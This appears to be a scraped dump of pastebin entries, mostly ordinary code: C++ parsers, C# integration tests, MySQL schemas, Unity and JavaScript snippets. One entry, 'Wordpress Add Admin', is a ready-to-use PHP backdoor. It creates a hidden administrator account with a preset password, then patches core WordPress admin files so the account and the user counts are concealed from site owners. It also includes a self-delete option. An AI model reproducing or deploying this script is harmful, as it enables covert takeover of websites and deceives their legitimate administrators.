        key = stdscr.getch()
        
        if key == 450:
            cursor_y = max(0, cursor_y - 1)
        elif key == 456:
            cursor_y = min(len(lines) - 1, cursor_y + 1)
        elif key == 452: 
            cursor_x = max(0, cursor_x - 1)
        elif key == 454:
            cursor_x = min(len(lines[cursor_y]) - 1, cursor_x + 1)
        else:
            if chr(key) in ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}:.,;!?() "":  
                try:
                    lines[cursor_y] = lines[cursor_y][:cursor_x] + chr(key) + lines[cursor_y][cursor_x+1:]
                    lines = xor_column(cursor_x, cursor_y, chr(key), lines, file_name)
                    cursor_x = min(len(lines[cursor_y]), cursor_x + 1)

                except ValueError:
                    pass

curses.wrapper(main)
"
tRSRZGbA,data906,TestGuy1,JSON,Wednesday 24th of April 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a1b0fec98446ce77aad5f832cf0bbb8ac1f34ed66b260eb75c07003460eeca5887f207c14abc1ee2a7c95fa208e94c578747f9f8af74bda5cce7797fef00eec6f8c93645bd383f0adc2b97dc8d2220c5a13340b939bbb6e01cbe8d8e792dbac3969791d803cea483d2c5719a72254abd9e79da26485d46263affd64db20b9bcb',
  otherdata: [
    '8c80d2355272d4dcf80d6fe804574ba7',
    '85d4d27e2a7f01537b8c53bffb153adb',
    '063975a17737674d77123b6ae8a00060',
    '250776cd68f116405bc2824382b4cce2',
    '5d6eea6a069f52e6768b689fa7c9fbda',
    '69c546fd6e30987e084fb89171f42ac0',
    'a82f5262e4bc84c37eea2826c410e88c',
    'c098f0f48a03d112fdceec2fe8f4ac4c'
  ]
}"
2UN2paHf,input_reader.cpp,cepxuozab,C++,Wednesday 24th of April 2024 05:01:21 AM CDT,"#include ""input_reader.h""
#include <cctype> 
#include <algorithm>
#include <cassert>
#include <iterator>
#include <string>
#include <utility>
#include <string_view>
#include <unordered_map>
#include <iostream>

namespace TransportCatalogue {
namespace detail {

/**
 * Парсит строку вида ""10.123,  -30.1837"" и возвращает пару координат (широта, долгота)
 */
Coordinates ParseCoordinates(std::string_view str) {
    static const double nan = std::nan("""");
 
    auto not_space = str.find_first_not_of(' ');
    auto comma = str.find(',');
 
    if (comma == str.npos) {
        return { nan, nan };
    }
 
    auto not_space2 = str.find_first_not_of(' ', comma + 1);
 
    double lat = std::stod(std::string(str.substr(not_space, comma - not_space)));
    double lng = std::stod(std::string(str.substr(not_space2)));
 
    return { lat, lng };
}
 
/**
 * Удаляет пробелы в начале и конце строки
 */
std::string_view Trim(std::string_view string) {
    const auto start = string.find_first_not_of(' ');
    if (start == string.npos) {
        return {};
    }
    return string.substr(start, string.find_last_not_of(' ') + 1 - start);
}
 
/**
 * Разбивает строку string на n строк, с помощью указанного символа-разделителя delim
 */
std::vector<std::string_view> Split(std::string_view string, char delim) {
    std::vector<std::string_view> result;
 
    size_t pos = 0;
    while ((pos = string.find_first_not_of(' ', pos)) < string.length()) {
        auto delim_pos = string.find(delim, pos);
        if (delim_pos == string.npos) {
            delim_pos = string.size();
        }
        if (auto substr = Trim(string.substr(pos, delim_pos - pos)); !substr.empty()) {
            result.push_back(substr);
        }
        pos = delim_pos + 1;
    }
 //   for (const auto x : result) {
  //      std::cout << x << std::endl;
  //  }
    return result;
}
 
/**
 * Парсит маршрут.
 * Для кольцевого маршрута (A>B>C>A) возвращает массив названий остановок [A,B,C,A]
 * Для некольцевого маршрута (A-B-C-D) возвращает массив названий остановок [A,B,C,D,C,B,A]
 */
std::vector<std::string_view> ParseRoute(std::string_view route) {
    if (route.find('>') != route.npos) {
        return Split(route, '>');
    }
 
    auto stops = Split(route, '-');
    std::vector<std::string_view> results(stops.begin(), stops.end());
    results.insert(results.end(), std::next(stops.rbegin()), stops.rend());
 
    return results;
}
 
CommandDescription ParseCommandDescription(std::string_view line) {
    auto colon_pos = line.find(':');
    if (colon_pos == line.npos) {
        return {};
    }
 
    auto space_pos = line.find(' ');
    if (space_pos >= colon_pos) {
        return {};
    }
 
    auto not_space = line.find_first_not_of(' ', space_pos);
    if (not_space >= colon_pos) {
        return {};
    }
 
    return { std::string(line.substr(0, space_pos)),
            std::string(line.substr(not_space, colon_pos - not_space)),
            std::string(line.substr(colon_pos + 1)) };
}
   
std::pair<Coordinates, std::vector<std::pair<std::string, double>>> ParseStopDescription(std::string_view description) {
    std::pair<Coordinates, std::vector<std::pair<std::string, double>>> result;
    std::string desc_str(description);
    std::cout<<""Stop descriptions:""<<desc_str<<'\n';

    size_t pos = 0;
    size_t next_pos = 0;

    next_pos = desc_str.find(',');
        if (next_pos != std::string::npos) {
            next_pos = desc_str.find(',', next_pos + 1);
            auto coordinates_str = desc_str.substr(pos, next_pos - pos);
            //std::cout << ""Parsed coordinates: "" << coordinates_str << std::endl;
            result.first = ParseCoordinates(coordinates_str);
            pos = next_pos + 1;
        } 
    

    desc_str = desc_str.substr(pos);
        std::cout<<""Stop description after ParseCoord ""<<desc_str<<'\n';
    std::vector<std::string_view> strings = Split(desc_str, ',');
    if (!strings.empty()) {
        for (const auto& str : strings) {
            auto m_to_pos = str.find(""m to "");
            if (m_to_pos != std::string::npos) {
                std::string stop_name = std::string(str).substr(m_to_pos + 5);
                double distance = std::stod(std::string(str.substr(0, m_to_pos)));
                //std::cout << distance << std::endl;
                result.second.push_back({stop_name, distance});
            }
        }
    }

    return result;
}

void InputReader::ParseLine(std::string_view line) {
    auto command_description = ParseCommandDescription(line);
    if (command_description) {
        commands_.push_back(std::move(command_description));
    }
}

void InputReader::ApplyCommands(TransportCatalogue& catalogue) const {
    for (const auto& command : commands_) {
        if (command.command == ""Stop"") {
            auto [coordinates, stops_info_] = ParseStopDescription(command.description);
            for (const auto& stop_info : stops_info_) {
                catalogue.AddStop(command.id, coordinates);
                catalogue.AddStop(stop_info.first, coordinates);
                catalogue.AddDistance(command.id,stop_info.first,stop_info.second);
                std::cout << command.id << "" to "" << stop_info.first << "" "" << stop_info.second << std::endl;
            }
        } else if (command.command == ""Bus"") {
            std::vector<std::string_view> stops_str = ParseRoute(command.description);  
            std::vector<const Stop*> stops;
            for (const auto& stop_name : stops_str) {
                const Stop* stop = catalogue.FindStop(stop_name);
                if (stop) {
                    stops.push_back(stop);
                } 
            }
            if (!stops.empty()) {
                bool isCircular = (stops.front() == stops.back());
                catalogue.AddRoute(command.id, stops, isCircular);
                }
        }
    }
}


} // namespace detail
} // namespace TransportCatalogue
"
Y8Y9zB7v,Untitled,BbJLeB,Python,Wednesday 24th of April 2024 05:00:44 AM CDT,"using CarGalleryConsoleAPI.Business;
using CarGalleryConsoleAPI.Business.Contracts;
using CarGalleryConsoleAPI.Data.Model;
using CarGalleryConsoleAPI.DataAccess;
using System.ComponentModel.DataAnnotations;
using Moq;
using CarGalleryConsoleAPI.DataAccess.Contracts;
using CarGalleryConsoleAPI.Business;
using Microsoft.EntityFrameworkCore;

namespace CarGalleryConsoleAPI.IntegrationTests.NUnit
{
    internal class IntegrationTests
    {
        private TestCarDbContext dbContext;
        private ICarsManager carsManager;

        [SetUp]
        public void SetUp()
        {
            this.dbContext = new TestCarDbContext();
            this.carsManager = new CarsManager(new CarsRepository(this.dbContext));
        }

        [TearDown]
        public void TearDown()
        {
            this.dbContext.Database.EnsureDeleted();
            this.dbContext.Dispose();
        }

        //positive test
        [Test]
        public async Task AddCarAsync_ShouldAddNewCar()
        {
            // Arrange
            var newCar = new Car
            {
                CatalogNumber = ""ABCD7894EFGH"",
                Make = ""Toyota"",
                Model = ""Camry"",
                Color = ""Blue"",
                Year = 2022,
                Mileage = 5000,
                Price = 25000,
                Availability = true
            };

            // Act
            await this.carsManager.AddAsync(newCar);

            var car = await dbContext.Cars.FirstOrDefaultAsync(p => p.CatalogNumber == newCar.CatalogNumber);

            // Assert
            Assert.That(car, Is.Not.Null);
            Assert.That(car.CatalogNumber, Is.EqualTo(newCar.CatalogNumber));
            Assert.That(car.Make, Is.EqualTo(newCar.Make));
            Assert.That(car.Model, Is.EqualTo(newCar.Model));
            Assert.That(car.Color, Is.EqualTo(newCar.Color));
            Assert.That(car.Year, Is.EqualTo(newCar.Year));
            Assert.That(car.Mileage, Is.EqualTo(newCar.Mileage));
            Assert.That(car.Price, Is.EqualTo(newCar.Price));
            Assert.That(car.Availability, Is.EqualTo(true));
        }

        //Negative test
        [Test]
        public async Task AddCarAsync_TryToAddCarWithInvalidCredentials_ShouldThrowException()
        {
            // Arrange

            // Act
            var exception = Assert.ThrowsAsync<ValidationException>(() => this.carsManager.AddAsync(new Car
            {
            }));



            // Assert
            Assert.That(exception.Message, Is.EqualTo(""Invalid car!""));

        }

        [Test]
        public async Task DeleteCarAsync_WithValidCatalogNumber_ShouldRemoveCarFromDb()
        {
            // Arrange
            var newCar = new Car
            {
                CatalogNumber = ""ABCD7894EFGH"",
                Make = ""Toyota"",
                Model = ""Camry"",
                Color = ""Blue"",
                Year = 2022,
                Mileage = 5000,
                Price = 25000,
                Availability = true
            };

            // Act
            await this.carsManager.DeleteAsync(newCar.CatalogNumber);

            // Assert
            Assert.That(dbContext.Cars.Count(), Is.EqualTo(0));
            Assert.That(await dbContext.Cars.FirstOrDefaultAsync(p => p.CatalogNumber == newCar.CatalogNumber), Is.Null);
        }

        [TestCase("""")]
        [TestCase(""    "")]
        [TestCase(null!)]
        public async Task DeleteCarAsync_TryToDeleteWithNullOrWhiteSpaceCatalogNumber_ShouldThrowException(string nullOrWhitespaceNumber)
        {
            // Arrange

            // Act
            var exception = Assert.ThrowsAsync<ArgumentException>(() => carsManager.DeleteAsync(nullOrWhitespaceNumber));

            // Assert
            Assert.That(exception.Message, Is.EqualTo(""Catalog number cannot be empty.""));
        }

        [Test]
        public async Task GetAllAsync_WhenCarsExist_ShouldReturnAllCars()
        {
            // Arrange
            var newCar = new Car
            {
                CatalogNumber = ""ABCD7894EFGH"",
                Make = ""Toyota"",
                Model = ""Camry"",
                Color = ""Blue"",
                Year = 2022,
                Mileage = 5000,
                Price = 25000,
                Availability = true
            };
            await this.carsManager.AddAsync(newCar);

            // Act
            var result = await this.carsManager.GetAllAsync();

            // Assert
            Assert.That(result, Is.Not.Null);
            Assert.That(result.Count(), Is.EqualTo(1));
            Assert.That(result.First().CatalogNumber, Is.EqualTo(newCar.CatalogNumber));
            Assert.That(result.First().Make, Is.EqualTo(newCar.Make));
            Assert.That(result.First().Model, Is.EqualTo(newCar.Model));
            Assert.That(result.First().Color, Is.EqualTo(newCar.Color));
            Assert.That(result.First().Year, Is.EqualTo(newCar.Year));
            Assert.That(result.First().Mileage, Is.EqualTo(newCar.Mileage));
            Assert.That(result.First().Price, Is.EqualTo(newCar.Price));
            Assert.That(result.First().Availability, Is.EqualTo(true));
        }

        [Test]
        public async Task GetAllAsync_WhenNoCarsExist_ShouldThrowKeyNotFoundException()
        {
            // Arrange

            // Act
            var exception = Assert.ThrowsAsync<KeyNotFoundException>(() => carsManager.GetAllAsync());

            // Assert
            Assert.That(exception.Message, Is.EqualTo(""No car found.""));
        }

        [Test]
        public async Task SearchByModelAsync_WithExistingModel_ShouldReturnMatchingCars()
        {
            // Arrange
            var newCar = new Car
            {
                CatalogNumber = ""ABCD7894EFGH"",
                Make = ""Toyota"",
                Model = ""Camry"",
                Color = ""Blue"",
                Year = 2022,
                Mileage = 5000,
                Price = 25000,
                Availability = true
            };
            await this.carsManager.AddAsync(newCar);

            // Act
            var result = await this.carsManager.SearchByModelAsync(newCar.Model);

            // Assert
            Assert.That(result, Is.Not.Null);
            Assert.That(result.Count(), Is.EqualTo(1));
            Assert.That(result.First().CatalogNumber, Is.EqualTo(newCar.CatalogNumber));
            Assert.That(result.First().Make, Is.EqualTo(newCar.Make));
            Assert.That(result.First().Model, Is.EqualTo(newCar.Model));
            Assert.That(result.First().Color, Is.EqualTo(newCar.Color));
            Assert.That(result.First().Year, Is.EqualTo(newCar.Year));
            Assert.That(result.First().Mileage, Is.EqualTo(newCar.Mileage));
            Assert.That(result.First().Price, Is.EqualTo(newCar.Price));
            Assert.That(result.First().Availability, Is.EqualTo(true));
        }

        [Test]
        public async Task SearchByModelAsync_WithNonExistingModel_ShouldThrowKeyNotFoundException()
        {
            // Arrange

            // Act
            var exception = Assert.ThrowsAsync<KeyNotFoundException>(() => carsManager.SearchByModelAsync(""Moskvich""));

            // Assert
            Assert.That(exception.Message, Is.EqualTo(""No car found with the given model.""));
        }

        [Test]
        public async Task GetSpecificAsync_WithValidCatalogNumber_ShouldReturnCar()
        {
            // Arrange
            var newCar = new Car
            {
                CatalogNumber = ""ABCD7894EFGH"",
                Make = ""Toyota"",
                Model = ""Camry"",
                Color = ""Blue"",
                Year = 2022,
                Mileage = 5000,
                Price = 25000,
                Availability = true
            };
            await this.carsManager.AddAsync(newCar);

            // Act
            var result = await this.carsManager.GetSpecificAsync(newCar.CatalogNumber);

            // Assert
            Assert.That(result, Is.Not.Null);
            Assert.That(result.CatalogNumber, Is.EqualTo(newCar.CatalogNumber));
            Assert.That(result.Make, Is.EqualTo(newCar.Make));
            Assert.That(result.Model, Is.EqualTo(newCar.Model));
            Assert.That(result.Color, Is.EqualTo(newCar.Color));
            Assert.That(result.Year, Is.EqualTo(newCar.Year));
            Assert.That(result.Mileage, Is.EqualTo(newCar.Mileage));
            Assert.That(result.Price, Is.EqualTo(newCar.Price));
            Assert.That(result.Availability, Is.EqualTo(true));
        }

        [Test]
        public async Task GetSpecificAsync_WithInvalidCatalogNumber_ShouldThrowKeyNotFoundException()
        {
            // Arrange

            // Act
            var exception = Assert.ThrowsAsync<KeyNotFoundException>(() => carsManager.GetSpecificAsync(""ABCD7894""));

            // Assert
            Assert.That(exception.Message, Is.EqualTo(""No car found with catalog number: ABCD7894""));
        }

        [Test]
        public async Task UpdateAsync_WithValidCar_ShouldUpdateCar()
        {
            // Arrange
            var newCar = new Car
            {
                CatalogNumber = ""ABCD7894EFGH"",
                Make = ""Toyota"",
                Model = ""Camry"",
                Color = ""Blue"",
                Year = 2022,
                Mileage = 5000,
                Price = 25000,
                Availability = true
            };
            await this.carsManager.AddAsync(newCar);

            // Act
            var updatedCar = await dbContext.Cars.FirstOrDefaultAsync(p => p.CatalogNumber == newCar.CatalogNumber);
            updatedCar.Color = ""Red"";

            // Assert
            Assert.That(updatedCar, Is.Not.Null);
            Assert.That(updatedCar.CatalogNumber, Is.EqualTo(newCar.CatalogNumber));
            Assert.That(updatedCar.Make, Is.EqualTo(newCar.Make));
            Assert.That(updatedCar.Model, Is.EqualTo(newCar.Model));
            Assert.That(updatedCar.Color, Is.EqualTo(""Red""));
            Assert.That(updatedCar.Year, Is.EqualTo(newCar.Year));
            Assert.That(updatedCar.Mileage, Is.EqualTo(newCar.Mileage));
            Assert.That(updatedCar.Price, Is.EqualTo(newCar.Price));
            Assert.That(updatedCar.Availability, Is.EqualTo(true));
        }

        [Test]
        public async Task UpdateAsync_WithInvalidCar_ShouldThrowValidationException()
        {
            // Arrange

            // Act
            var exception = Assert.ThrowsAsync<ValidationException>(() => carsManager.UpdateAsync(new Car()));

            // Assert
            Assert.That(exception.Message, Is.EqualTo(""Invalid car!""));
        }

    }
}
"
9v7WtB8w,CREATE TABLE R2,Nikitalox,MySQL,Wednesday 24th of April 2024 04:48:08 AM CDT,"CREATE TABLE `r2` (
  `Производитель` varchar(255) NOT NULL,
  `web-сайт Производителя` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`Производитель`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
"
iZFsZ5dz,CREATE TABLE R3,Nikitalox,MySQL,Wednesday 24th of April 2024 04:47:06 AM CDT,"CREATE TABLE `r3` (
  `Модель` varchar(255) NOT NULL,
  `Производитель` varchar(255) NOT NULL,
  `объем диска, Gb` int unsigned NOT NULL,
  `скор. вращ.
шпинделя, rpm` int unsigned DEFAULT NULL,
  `тип интерфейса` enum('IDE','Channel','SCSI','SATA') DEFAULT NULL,
  PRIMARY KEY (`Модель`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
"
zR0Twh2q,Create Spline From Points,Staggart,C#,Wednesday 24th of April 2024 04:45:50 AM CDT,"using System;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Splines;

namespace sc.modeling.splines.runtime.auxiliary
{
    public class CreateSplineFromPoints : MonoBehaviour
    {
        [Header(""Input"")]
        [Tooltip(""Positional points in local-space"")]
        public List<Vector3> points = new List<Vector3>()
        {
            new Vector3(-1f, 0f, -5f),
            new Vector3(1f, 0f, -2.5f),
            new Vector3(-1f, 0f, 0),
            new Vector3(1f, 0f, 2.5f),
            new Vector3(-1f, 0f, 5f),
        };
        
        [Space]
        
        [Header(""Output"")]
        public SplineContainer splineContainer;
        public bool smooth = true;
        
        private void Reset()
        {
            splineContainer = GetComponent<SplineContainer>();
            if (!splineContainer) splineContainer = this.gameObject.AddComponent<SplineContainer>();
        }
        
        private void OnValidate()
        {
            if (!splineContainer) return;

            int pointCount = points.Count;

            if (pointCount < 2) return;
            
            //First, delete all existing splines
            for (int s = 0; s < splineContainer.Splines.Count; s++)
            {
                splineContainer.RemoveSpline(splineContainer.Splines[s]);
            }

            Spline spline = new Spline(pointCount);
            
            for (int i = 0; i < pointCount; i++)
            {
                BezierKnot knot = new BezierKnot();
                knot.Position = points[i];
                knot.Rotation = Quaternion.identity;

                spline.Add(knot, smooth ? TangentMode.AutoSmooth : TangentMode.Linear);
            }
            
            //Automatically recalculate tangents
            spline.SetTangentMode(new SplineRange(0, spline.Count), smooth ? TangentMode.AutoSmooth : TangentMode.Linear);
   
            //Adding a spline automatically rebuilds the mesh
            splineContainer.AddSpline(spline);
        }

        private void OnDrawGizmosSelected()
        {
            if (!splineContainer) return;

            Gizmos.matrix = splineContainer.transform.localToWorldMatrix;
            foreach (Vector3 p in points)
            {
                Gizmos.DrawSphere(p, 0.25f);
            }
        }
    }
}"
TFcvyiM9,Forward conversation to email,quentin-messagebird,JavaScript,Wednesday 24th of April 2024 04:41:42 AM CDT,"'use-strict';
/**
* The handler function receives context and variables. It returns new variables to be used in your flow.
*
* @param {object} context - the context contains environment variables accessible as context.env.varName1
* @param {object} variables - the variables from your flow (the input parameters) accessible as variables.varName1
* @returns {object} - return values that will become available in your flow
* @throws ExecutionError
*/

const axios = require('axios');
var format = require('date-fns/format');
var parseISO = require('date-fns/parseISO');


function fetchConversation(offset, variables, context, entireConversation) {
    return axios({
        method: 'GET',
        url: `https://conversations.messagebird.com/v1/conversations/${variables.conversationId}/messages?limit=20${offset > 0 ? `&offset=${offset}`: ''}`,
        headers: {
            Authorization: 'AccessKey ' + context.env.TOKEN,
        },
    })
    .then((response) => {
        let newEntireConversation = [...entireConversation, ...response.data.items];
        if (response.data.totalCount > response.data.count + offset) {
            return fetchConversation(offset + 20, variables, context, newEntireConversation);
        }
        return newEntireConversation;
    })
    .catch((error) => {
        throw error.message;
    });
}

async function sendConversationToEmail(conversation, conversationId, recipientEmail, context) {
    let conversationThread = 'Here is the conversation summary:\n';
    let conversationAttachments = [];
    conversation.filter(elem => elem.type !== 'event' && elem.type !== 'interactive').forEach(elem => {
        let msg = `Date: ${format(parseISO(elem.createdDatetime), ""PPpp"")}\n`
        if (elem.content.text) msg += elem.content.text;
        else if (elem.content.email) msg += elem.content.email.content.text + `\n`;
        else if (elem.type === 'image') conversationAttachments.push(elem.content.image.url.split(""https://messaging.messagebird.com/v1/files/"")[1]);
        else if (elem.type === 'file') conversationAttachments.push(elem.content.file.url.split(""https://messaging.messagebird.com/v1/files/"")[1]);
        conversationThread += msg + '\n-------------------\n';
    })
    const response = await axios({
        method: 'POST',
        url: ""https://conversations.messagebird.com/v1/send"",
        headers: {
            'Authorization': 'AccessKey ' + context.env.TOKEN,
        },
        data: {
            ""to"": recipientEmail,
            ""from"": context.env.FREEMAIL_CHANNEL_ID,
            ""type"": ""email"",
            ""content"": {
                ""email"": {
                    ""to"": [{
                        ""address"": recipientEmail
                    }],
                    ""from"": {
                        ""name"": ""MessageBird"",
                        ""address"": ""email@REPLACE-WITH-YOUR-INBOX-DOMAIN.inbox.ai""
                    },
                    ""subject"": `Forwarded conversation [conversationID:${conversationId}]`,
                    ""content"": {
                        ""text"": conversationThread
                    },
                    ""attachments"": conversationAttachments.map(attachment => ({
                        id: attachment
                    }))
                }
            }
        }
    })
}

exports.handler = async function(context, variables) {
    if (!variables.hasOwnProperty('conversationId')) {
        throw 'Conversation Id parameter is required';
    }
    if (!variables.hasOwnProperty('recipientEmail')) {
        throw 'recipientEmail parameter is required';
    }
    let offset = 0;
    try {
        const conversation = await fetchConversation(offset, variables, context, []);
        await sendConversationToEmail(conversation, variables.conversationId, variables.recipientEmail, context);

        return {
            status: 'success'
        }
    } catch (e) {
        throw 'Something went wrong';
    }
};"
WWH6R2qJ,Untitled,s-sols,CSS,Wednesday 24th of April 2024 04:34:55 AM CDT,"body.seraph-accel-js-lzl-ing .dipi-carousel-main, body.seraph-accel-js-lzl-ing.dipi-anim-preload .dipi-hover-box-container {
	display:unset!important
}

/* lb */
body.page-id-23743531.seraph-accel-js-lzl-ing.dipi-anim-preload .dipi_hover_box .dipi-hover-box-container.dipi-hover-box-fade {
	display: block !important;
}

body.page-id-23743531 .et_pb_section_12 .et_pb_module.et_pb_text {
	animation: none;
	transform: none !important;
}"
cLLeMmYj,Запрос для создания таблицы R1,Nikitalox,MySQL,Wednesday 24th of April 2024 04:33:44 AM CDT,"CREATE TABLE `lab_6_hdd`.`r1` (
  `Серийный номер` INT NOT NULL,
  `Модель` VARCHAR(250) NOT NULL,
  PRIMARY KEY (`Серийный номер`),
  UNIQUE INDEX `Серийный номер_UNIQUE` (`Серийный номер` ASC) VISIBLE);
"
zfP2KB4d,Wordpress Add Admin,willysec_id,PHP,Wednesday 24th of April 2024 04:23:57 AM CDT,"<?php
//Place this file to rootdir of wordpress cms
header(""Content-Type: text/html;charset=utf-8"");
ini_set('max_execution_time', '0');
error_reporting(E_ALL);
ini_set('display_errors', '1');
require __DIR__ . '/wp-load.php';
$con = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
if(mysqli_connect_errno($con)){die(""Failed to connect to MySQL: "".mysqli_connect_error());}
mysqli_query($con, ""SET NAMES "".DB_CHARSET);
$notice = '';
$user_name = isset($_POST['user_name']) ? $_POST['user_name'] : '';
$pwd = isset($_POST['pwd']) ? $_POST['pwd'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';
    if($_POST['action'] == 'del'){
        $file_path = __DIR__.'/wp-add.php';
        if(file_exists($file_path)){
            unlink($file_path);
        }
    }
if($user_name != '' && $pwd != '' && $email != ''){    
    if(!function_exists('wp_hash_password')){
        function wp_hash_password($password){
             global $wp_hasher;
            if(empty($wp_hasher)){
                require_once ABSPATH . WPINC . '/class-phpass.php';
                 $wp_hasher = new PasswordHash( 8, true );
            }
            return $wp_hasher->HashPassword( trim( $password ) );
         }
     }

     $user_id = 0;
    $check = mysqli_query($con, ""SELECT * FROM `"".$table_prefix.""users` WHERE `user_login` = '"".addslashes($user_name).""' OR `user_email` = '"".addslashes($email).""'"");
    if(mysqli_num_rows($check) > 0){
         $notice = '该用户名或邮箱已被使用过。';
        $row = mysqli_fetch_array($check, MYSQLI_ASSOC);
         $user_id = $row['ID'];
    }else{
         $hash = wp_hash_password($pwd);
        mysqli_query($con, ""INSERT INTO `"".$table_prefix.""users`  (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_registered`, `user_status`, `display_name`) VALUES ('"".addslashes($user_name).""', '"".addslashes($hash).""', '"".addslashes($user_name).""', '"".addslashes($email).""', '2020-06-14 00:00:00', 0, '"".addslashes($user_name).""')"");
        $user_id = mysqli_insert_id($con);
         if($user_id > 0){
             $code = 'a:1:{s:13:""administrator"";b:1;}';
             mysqli_query($con, ""INSERT INTO `"".$table_prefix.""usermeta`  (`user_id`, `meta_key`, `meta_value`) VALUES ("".$user_id."", 'nickname', '"".addslashes($user_name).""'), ("".$user_id."", 'first_name', ''), ("".$user_id."", 'last_name', ''), ("".$user_id."", 'description', ''), ("".$user_id."", 'rich_editing', 'true'), ("".$user_id."", 'syntax_highlighting', 'true'), ("".$user_id."", 'comment_shortcuts', 'false'), ("".$user_id."", 'admin_color', 'fresh'), ("".$user_id."", 'use_ssl', 0), ("".$user_id."", 'show_admin_bar_front', 'true'), ("".$user_id."", 'locale', ''), ("".$user_id."", '"".$table_prefix.""capabilities', '"".$code.""'), ("".$user_id."", '"".$table_prefix.""user_level', 10)"");
             if(mysqli_insert_id($con) > 0){
                 $notice = '用户添加成功';
             }else{
                $notice = '用户添加失败';
            }
        }else{
            $notice = '用户添加失败';
         }
    }

    if($user_id > 0){
        $code = '<style>#user-'.$user_id.'{display:none;}</style>';
        $path = ABSPATH.'wp-admin/admin-header.php';
         if(file_exists($path)){
            $temp = file_get_contents($path);
             if(strstr($temp, $code)){
                $notice .= ' Style 代码已添加过。';
            }else{
                if(strstr($temp, '<div id=""wpbody')){
                    $fp = fopen($path, ""wb"");
                    fwrite($fp, str_replace('<div id=""wpbody', $code.'<div id=""wpbody', $temp)); 
                   fclose($fp);
                    $notice .= ' Style 代码添加成功。';
                }else{
                    $notice .= ' Style 代码添加失败。';
                }
            }
        }else{
            $notice .= ' Style 文件查找失败。';
        }

         $path = ABSPATH.'wp-admin/includes/class-wp-users-list-table.php';
         if(file_exists($path)){
             $temp = file_get_contents($path);
            $status = 0;
            if(strstr($temp, 'number_format_i18n( $total_users-1') && (strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1') || strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')) ){
                $notice .= ' 隐藏数字 代码已添加过。';
            }else{
                 if(!strstr($temp, 'number_format_i18n( $total_users-1')){
                    $temp = str_replace('number_format_i18n( $total_users', 'number_format_i18n( $total_users-1', $temp);
                }
                if(!strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')){
                     $temp = str_replace('number_format_i18n( $avail_roles[$this_role]', 'number_format_i18n( $avail_roles[$this_role]-1', $temp);
                }
                if(!strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1')){
                    $temp = str_replace('number_format_i18n( $avail_roles[ $this_role ]', 'number_format_i18n( $avail_roles[ $this_role ]-1', $temp);
                }
               $fp = fopen($path, ""wb"");
               fwrite($fp, $temp);
               fclose($fp);
                 $notice .= ' 隐藏数字 代码添加成功。';                
             }
         }else{
             $notice .= ' 隐藏数字 文件查找失败。';
        }
   }

}


$sql = mysqli_query($con , ""SELECT * FROM `"".$table_prefix.""users`"");
$total = mysqli_num_rows($sql);
if($total > 0){
    $list = '';
    while($row = mysqli_fetch_array($sql, MYSQLI_ASSOC)){
        $list .= '<tr><td>'.$row['ID'].'</td><td>'.$row['user_login'].'</td><td>'.$row['user_email'].'</td><td>'.$row['user_nicename'].'</td><td>'.$row['user_registered'].'</td></tr>';
    }
}
mysqli_close($con);
?>
<!DOCTYPE html>
<html lang=""zh-CN"">
<head>
<title>Add WordPress Admin</title>
<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">
<meta http-equiv=""X-UA-Compatible"" content=""IE=edge,chrome=1"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<meta name=""robots"" content=""noindex, nofollow"">
<meta name=""renderer"" content=""webkit|ie-comp|ie-stand"">
<style>body{background-color:#F2F2F2;}.notice{background-color:#FFFF00;color:#0074BF;padding-left:10px;}.table{border-collapse:collapse;border-spacing:0;width:90%;margin:30px auto;}
.table td{word-break:break-all;max-width:300px;background-color:#FFF;}
.table th, .table td{border: 1px solid #ddd;padding:8px;}
.table tbody > tr:nth-child(2n+1) > td, .table tbody > tr:nth-child(2n+1) > th {background-color:#f9f9f9;}</style>
<script src=""https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js""></script>
</head>
<body>
<table class=""table"">
  <tr>
    <td colspan=""5"" align=""left""><div class=""notice""><?php echo $notice;?></div></td>
  </tr>
  <tr>
    <td colspan=""5"" align=""left"">【 添加新管理员 】</td>
  </tr>
  <tr>
    <td colspan=""5"" align=""left""><form action="""" method=""post"" name=""form"">用户名：<input type=""text"" value=""Support"" name=""user_name""> 密码：<input type=""text"" value=""vFELLmUMgJJdQW4S"" name=""pwd""> 邮箱：<input type=""text"" value=""support@wordpress.org"" name=""email""> <input type=""submit""></form></td>
  </tr>
  <tr>
    <td colspan=""5"" align=""left""><form action="""" method=""post"" name=""form""><input type='hidden' name=""action"" value='del'><input type=""submit"" value=""删除文件""></form></td>
  </tr>
  <tr>
    <td colspan=""5"" align=""left"">【 用户列表：<?php echo $total;?>位 】</td>
  </tr>
  <?php if($total > 0){?>
  <tr>
    <td>ID</td>
    <td>用户名</td>
    <td>邮箱</td>
    <td>昵称</td>
    <td>注册时间</td>
  </tr>
  <?php echo $list;}?>
</table>
</body>
</html>"
9cVF81Qu,Deque of Number,rado_dimitrov66,C++,Wednesday 24th of April 2024 04:03:13 AM CDT,"#include <iostream>

using namespace std;

// First task

struct DequeOfNumbers
{
	int valueKey;
	DequeOfNumbers* nextElement;
} *leftInput = NULL, * rightInput = NULL;



void popElement(short choose, short deleteOption, short countOfDelete)
{

	DequeOfNumbers* p;
	DequeOfNumbers* p2;


	switch (choose)
	{
	case 1:

		switch (deleteOption)
		{
		case 1:

			for (int i = 0; i < countOfDelete; i++)
			{
				p = leftInput;

				leftInput = leftInput->nextElement;

				delete p;

				if (!leftInput)
				{
					rightInput = NULL;

					break;


				}
			}


			break;

		case 2:

			while (leftInput)
			{
				p = leftInput;

				leftInput = leftInput->nextElement;

				delete p;

			}

			rightInput = NULL;


			break;
		default:
			break;
		}



		break;

	case 2:

